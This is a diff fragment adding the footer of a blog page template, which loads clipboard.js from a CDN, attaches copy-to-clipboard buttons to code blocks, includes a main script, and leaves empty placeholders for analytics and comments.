+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
